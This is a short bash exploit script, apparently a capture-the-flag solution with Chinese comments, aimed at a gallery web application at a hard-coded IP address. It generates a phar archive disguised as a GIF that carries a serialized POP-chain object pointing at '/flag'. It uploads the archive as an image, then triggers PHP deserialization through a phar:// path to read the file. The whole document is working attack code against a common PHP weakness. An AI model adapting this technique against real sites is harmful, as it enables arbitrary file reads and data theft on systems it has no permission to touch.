#!/bin/bash
# exp.sh —— 画廊 phar 反序列化 getflag
URL="http://160.202.254.160:10985"

# 0. 跨平台临时目录（Linux / macOS / Git Bash 均可）
WORKDIR=$(mktemp -d) || exit 1
trap 'cd /; rm -rf "$WORKDIR"' EXIT
cd "$WORKDIR" || exit 1

# 1. 生成读 /flag 的 phar（GIF89a 头 + POP 链 metadata）
cat > exp_gen.php <<'PHP'
<?php
class Gallery    { public $collection; }
class Collection { public $items = array(); }
class Painting   { public $path; }
$pt = new Painting(); $pt->path = '/flag';
$c  = new Collection(); $c->items = [$pt];
$g  = new Gallery();    $g->collection = $c;
$phar = new Phar(__DIR__ . '/exp.phar');
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($g);
$phar->addFromString('a.gif', 'test');
$phar->stopBuffering();
PHP
php -d phar.readonly=0 exp_gen.php || exit 1

# 2. 上传（伪 GIF）
NAME=$(curl -s -F "image=@exp.phar;filename=exp.gif;type=image/gif" "$URL/" \
      | grep -oE '[0-9a-f]{32}\.gif' | head -1)
echo "[+] uploaded: $NAME"

# 3. phar:// 触发反序列化,flag 追加在响应末尾
curl -s "$URL/?view=phar%3A%2F%2Fuploads%2F$NAME" \
  | grep -oE '作品名称: [^<]*' | grep -oE 'flag\{[^}]*\}'
